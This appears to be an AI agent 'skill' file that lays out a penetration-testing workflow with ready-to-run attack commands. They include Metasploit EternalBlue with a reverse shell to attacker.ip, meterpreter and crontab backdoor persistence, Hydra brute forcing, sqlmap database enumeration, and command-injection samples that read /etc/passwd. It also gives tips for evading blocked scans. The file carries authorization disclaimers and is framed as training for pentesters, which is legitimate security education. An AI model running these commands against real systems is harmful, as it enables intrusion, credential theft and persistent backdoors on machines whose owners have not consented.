---
name: ethical-hacking-methodology
description: "Master the complete penetration testing lifecycle from reconnaissance through reporting. This skill covers the five stages of ethical hacking methodology, essential tools, attack techniques, and professional reporting for authorized security assessments."
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> AUTHORIZED USE ONLY: Use this skill only for authorized penetration testing engagements, defensive validation, or controlled educational environments.

# Ethical Hacking Methodology

## Purpose

Master the complete penetration testing lifecycle from reconnaissance through reporting. This skill covers the five stages of ethical hacking methodology, essential tools, attack techniques, and professional reporting for authorized security assessments.

## Prerequisites

### Required Environment
- Kali Linux installed (persistent or live)
- Network access to authorized targets
- Written authorization from system owner

### Required Knowledge
- Basic networking concepts
- Linux command-line proficiency
- Understanding of web technologies
- Familiarity with security concepts

## Outputs and Deliverables

1. **Reconnaissance Report** - Target information gathered
2. **Vulnerability Assessment** - Identified weaknesses
3. **Exploitation Evidence** - Proof of concept attacks
4. **Final Report** - Executive and technical findings

## Core Workflow

### Phase 1: Understanding Hacker Types

Classification of security professionals:

**White Hat Hackers (Ethical Hackers)**
- Authorized security professionals
- Conduct penetration testing with permission
- Goal: Identify and fix vulnerabilities
- Also known as: penetration testers, security consultants

**Black Hat Hackers (Malicious)**
- Unauthorized system intrusions
- Motivated by profit, revenge, or notoriety
- Goal: Steal data, cause damage
- Also known as: crackers, criminal hackers

**Grey Hat Hackers (Hybrid)**
- May cross ethical boundaries
- Not malicious but may break rules
- Often disclose vulnerabilities publicly
- Mixed motivations

**Other Classifications**
- **Script Kiddies**: Use pre-made tools without understanding
- **Hacktivists**: Politically or socially motivated
- **Nation State**: Government-sponsored operatives
- **Coders**: Develop tools and exploits

### Phase 2: Reconnaissance

Gather information without direct system interaction:

**Passive Reconnaissance**
```bash
# WHOIS lookup
whois target.com

# DNS enumeration
nslookup target.com
dig target.com ANY
dig target.com MX
dig target.com NS

# Subdomain discovery
dnsrecon -d target.com

# Email harvesting
theHarvester -d target.com -b all
```

**Google Hacking (OSINT)**
```
# Find exposed files
site:target.com filetype:pdf
site:target.com filetype:xls
site:target.com filetype:doc

# Find login pages
site:target.com inurl:login
site:target.com inurl:admin

# Find directory listings
site:target.com intitle:"index of"

# Find configuration files
site:target.com filetype:config
site:target.com filetype:env
```

**Google Hacking Database Categories:**
- Files containing passwords
- Sensitive directories
- Web server detection
- Vulnerable servers
- Error messages
- Login portals

**Social Media Reconnaissance**
- LinkedIn: Organizational charts, technologies used
- Twitter: Company announcements, employee info
- Facebook: Personal information, relationships
- Job postings: Technology stack revelations

### Phase 3: Scanning

Active enumeration of target systems:

**Host Discovery**
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# ARP scan (local network)
arp-scan -l

# Discover live hosts
nmap -sP 192.168.1.0/24
```

**Port Scanning**
```bash
# TCP SYN scan (stealth)
nmap -sS target.com

# Full TCP connect scan
nmap -sT target.com

# UDP scan
nmap -sU target.com

# All ports scan
nmap -p- target.com

# Top 1000 ports with service detection
nmap -sV target.com

# Aggressive scan (OS, version, scripts)
nmap -A target.com
```

**Service Enumeration**
```bash
# Specific service scripts
nmap --script=http-enum target.com
nmap --script=smb-enum-shares target.com
nmap --script=ftp-anon target.com

# Vulnerability scanning
nmap --script=vuln target.com
```

**Common Port Reference**
| Port | Service | Notes |
|------|---------|-------|
| 21 | FTP | File transfer |
| 22 | SSH | Secure shell |
| 23 | Telnet | Unencrypted remote |
| 25 | SMTP | Email |
| 53 | DNS | Name resolution |
| 80 | HTTP | Web |
| 443 | HTTPS | Secure web |
| 445 | SMB | Windows shares |
| 3306 | MySQL | Database |
| 3389 | RDP | Remote desktop |

### Phase 4: Vulnerability Analysis

Identify exploitable weaknesses:

**Automated Scanning**
```bash
# Nikto web scanner
nikto -h http://target.com

# OpenVAS (command line)
omp -u admin -w password --xml="<get_tasks/>"

# Nessus (via API)
nessuscli scan --target target.com
```

**Web Application Testing (OWASP)**
- SQL Injection
- Cross-Site Scripting (XSS)
- Broken Authentication
- Security Misconfiguration
- Sensitive Data Exposure
- XML External Entities (XXE)
- Broken Access Control
- Insecure Deserialization
- Using Components with Known Vulnerabilities
- Insufficient Logging & Monitoring

**Manual Techniques**
```bash
# Directory brute forcing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# Web technology fingerprinting
whatweb target.com
```

### Phase 5: Exploitation

Actively exploit discovered vulnerabilities:

**Metasploit Framework**
```bash
# Start Metasploit
msfconsole

# Search for exploits
msf> search type:exploit name:smb

# Use specific exploit
msf> use exploit/windows/smb/ms17_010_eternalblue

# Set target
msf> set RHOSTS target.com

# Set payload
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST attacker.ip

# Execute
msf> exploit
```

**Password Attacks**
```bash
# Hydra brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt ftp://target.com

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Web Exploitation**
```bash
# SQLMap for SQL injection
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables

# XSS testing
# Manual: <script>alert('XSS')</script>

# Command injection testing
# ; ls -la
# | cat /etc/passwd
```

### Phase 6: Maintaining Access

Establish persistent access:

**Backdoors**
```bash
# Meterpreter persistence
meterpreter> run persistence -X -i 30 -p 4444 -r attacker.ip

# SSH key persistence
# Add attacker's public key to ~/.ssh/authorized_keys

# Cron job persistence
echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab
```

**Privilege Escalation**
```bash
# Linux enumeration
linpeas.sh
linux-exploit-suggester.sh

# Windows enumeration
winpeas.exe
windows-exploit-suggester.py

# Check SUID binaries (Linux)
find / -perm -4000 2>/dev/null

# Check sudo permissions
sudo -l
```

**Covering Tracks (Ethical Context)**
- Document all actions taken
- Maintain logs for reporting
- Avoid unnecessary system changes
- Clean up test files and backdoors

### Phase 7: Reporting

Document findings professionally:

**Report Structure**
1. **Executive Summary**
   - High-level findings
   - Business impact
   - Risk ratings
   - Remediation priorities

2. **Technical Findings**
   - Vulnerability details
   - Proof of concept
   - Screenshots/evidence
   - Affected systems

3. **Risk Ratings**
   - Critical: Immediate action required
   - High: Address within 24-48 hours
   - Medium: Address within 1 week
   - Low: Address within 1 month
   - Informational: Best practice recommendations

4. **Remediation Recommendations**
   - Specific fixes for each finding
   - Short-term mitigations
   - Long-term solutions
   - Resource requirements

5. **Appendices**
   - Detailed scan outputs
   - Tool configurations
   - Testing timeline
   - Scope and methodology

### Phase 8: Common Attack Types

**Phishing**
- Email-based credential theft
- Fake login pages
- Malicious attachments
- Social engineering component

**Malware Types**
- **Virus**: Self-replicating, needs host file
- **Worm**: Self-propagating across networks
- **Trojan**: Disguised as legitimate software
- **Ransomware**: Encrypts files for ransom
- **Rootkit**: Hidden system-level access
- **Spyware**: Monitors user activity

**Network Attacks**
- Man-in-the-Middle (MITM)
- ARP Spoofing
- DNS Poisoning
- DDoS (Distributed Denial of Service)

### Phase 9: Kali Linux Setup

Install penetration testing platform:

**Hard Disk Installation**
1. Download ISO from kali.org
2. Boot from installation media
3. Select "Graphical Install"
4. Configure language, location, keyboard
5. Set hostname and root password
6. Partition disk (Guided - use entire disk)
7. Install GRUB bootloader
8. Reboot and login

**Live USB (Persistent)**
```bash
# Create bootable USB
dd if=kali-linux.iso of=/dev/sdb bs=512k status=progress

# Create persistence partition
gparted /dev/sdb
# Add ext4 partition labeled "persistence"

# Configure persistence
mkdir /mnt/usb
mount /dev/sdb2 /mnt/usb
echo "/ union" > /mnt/usb/persistence.conf
umount /mnt/usb
```

### Phase 10: Ethical Guidelines

**Legal Requirements**
- Obtain written authorization
- Define scope clearly
- Document all testing activities
- Report all findings to client
- Maintain confidentiality

**Professional Conduct**
- Work ethically with integrity
- Respect privacy of data accessed
- Avoid unnecessary system damage
- Execute planned tests only
- Never use findings for personal gain

## Quick Reference

### Penetration Testing Lifecycle

| Stage | Purpose | Key Tools |
|-------|---------|-----------|
| Reconnaissance | Gather information | theHarvester, WHOIS, Google |
| Scanning | Enumerate targets | Nmap, Nikto, Gobuster |
| Exploitation | Gain access | Metasploit, SQLMap, Hydra |
| Maintaining Access | Persistence | Meterpreter, SSH keys |
| Reporting | Document findings | Report templates |

### Essential Commands

| Command | Purpose |
|---------|---------|
| `nmap -sV target` | Port and service scan |
| `nikto -h target` | Web vulnerability scan |
| `msfconsole` | Start Metasploit |
| `hydra -l user -P list ssh://target` | SSH brute force |
| `sqlmap -u "url?id=1" --dbs` | SQL injection |

## Constraints and Limitations

### Authorization Required
- Never test without written permission
- Stay within defined scope
- Report unauthorized access attempts

### Professional Standards
- Follow rules of engagement
- Maintain client confidentiality
- Document methodology used
- Provide actionable recommendations

## Troubleshooting

### Scans Blocked

**Solutions:**
1. Use slower scan rates
2. Try different scanning techniques
3. Use proxy or VPN
4. Fragment packets

### Exploits Failing

**Solutions:**
1. Verify target vulnerability exists
2. Check payload compatibility
3. Adjust exploit parameters
4. Try alternative exploits

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.
